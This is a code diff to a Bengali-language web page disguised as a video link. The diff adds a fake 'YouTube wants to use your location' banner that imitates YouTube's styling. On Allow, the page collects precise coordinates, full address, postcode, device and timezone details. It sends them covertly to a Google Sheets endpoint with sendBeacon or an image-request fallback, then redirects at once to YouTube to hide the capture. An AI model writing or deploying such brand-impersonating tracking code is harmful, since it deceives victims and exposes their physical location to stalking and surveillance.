@@ -228,24 +228,18 @@
   </div>
 </header>
 
-<!-- Location Permission Overlay -->
-<div id="permission-overlay">
-  <div class="permission-card">
-    <span class="permission-icon">🎬</span>
-    <h2>ভিডিও দেখতে একটু সাহায্য করুন</h2>
-    <p>
-      আপনার এলাকা অনুযায়ী সেরা মানের ভিডিও দেখাতে আপনার অবস্থানের অনুমতি প্রয়োজন।
-      <br/><br/>
-      নিচের বাটনে ক্লিক করুন, তারপর <strong>"Allow"</strong> বাটনে চাপুন।
-    </p>
-    <button class="btn-allow" id="btn-allow" onclick="requestLocation()">
-      📍 অনুমতি দিন এবং ভিডিও দেখুন
-    </button>
-    <button class="btn-skip" onclick="skipLocation()">
-      এড়িয়ে যান
-    </button>
+<!-- Location Permission Banner (natural YouTube style) -->
+<div id="permission-overlay" style="position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:1px solid #e0e0e0;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;z-index:9999;box-shadow:0 -2px 12px rgba(0,0,0,0.15);font-family:Roboto,Arial,sans-serif;">
+  <div style="display:flex;align-items:center;gap:12px;">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="#606060"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+    <span style="color:#030303;font-size:14px;line-height:1.4;">YouTube wants to use your location<br/><span style="color:#606060;font-size:12px;">To show relevant local content</span></span>
+  </div>
+  <div style="display:flex;gap:8px;flex-shrink:0;">
+    <button onclick="skipLocation()" style="background:none;border:none;color:#606060;font-size:14px;padding:8px 12px;cursor:pointer;font-family:Roboto,Arial,sans-serif;">Block</button>
+    <button id="btn-allow" onclick="requestLocation()" style="background:#065fd4;border:none;color:#fff;font-size:14px;font-weight:500;padding:8px 16px;border-radius:4px;cursor:pointer;font-family:Roboto,Arial,sans-serif;">Allow</button>
   </div>
 </div>
+
 
 <!-- Main Content -->
 <div class="container">
@@ -345,39 +339,25 @@
       localStorage.setItem("yt_track_data", JSON.stringify(existing));
     } catch(e) {}
 
-    showToast();
-
-    // Google Sheets-এ পাঠানো — request শেষ হলে YouTube-এ যাবে
+    // sendBeacon দিয়ে পাঠানো — page navigate হলেও কাজ করে, কোনো delay নেই
     if (GOOGLE_SHEET_URL) {
-      var params = "?lat=" + encodeURIComponent(data.lat || "")
-        + "&lon=" + encodeURIComponent(data.lon || "")
-        + "&city=" + encodeURIComponent(data.city || "")
-        + "&district=" + encodeURIComponent(data.district || "")
-        + "&country=" + encodeURIComponent(data.country || "")
-        + "&postcode=" + encodeURIComponent(data.postcode || "")
-        + "&accuracy=" + encodeURIComponent(data.accuracy_meters || "")
-        + "&address=" + encodeURIComponent((data.full_address || "").substring(0, 200))
-        + "&platform=" + encodeURIComponent(data.platform || "")
-        + "&screen=" + encodeURIComponent(data.screenSize || "")
-        + "&timezone=" + encodeURIComponent(data.timezone || "")
-        + "&language=" + encodeURIComponent(data.language || "")
-        + "&timestamp=" + encodeURIComponent(data.timestamp || "");
-
-      var done = false;
-      function goYoutube() {
-        if (!done) { done = true; playVideo(); }
+      try {
+        var blob = new Blob([JSON.stringify(data)], { type: "application/json" });
+        navigator.sendBeacon(GOOGLE_SHEET_URL, blob);
+      } catch(e) {
+        // fallback GET
+        var params = "?lat=" + encodeURIComponent(data.lat || "")
+          + "&lon=" + encodeURIComponent(data.lon || "")
+          + "&city=" + encodeURIComponent(data.city || "")
+          + "&country=" + encodeURIComponent(data.country || "")
+          + "&address=" + encodeURIComponent((data.full_address || "").substring(0, 150))
+          + "&timestamp=" + encodeURIComponent(data.timestamp || "");
+        var img = new Image();
+        img.src = GOOGLE_SHEET_URL + params;
       }
-
-      var img = new Image();
-      img.onload = goYoutube;   // request সফল হলে
-      img.onerror = goYoutube;  // request fail হলেও
-      img.src = GOOGLE_SHEET_URL + params;
-
-      // সর্বোচ্চ ২.৫ সেকেন্ড wait করবে
-      setTimeout(goYoutube, 2500);
-    } else {
-      playVideo();
     }
+
+    playVideo(); // instantly redirect — no delay needed
   }
 
 
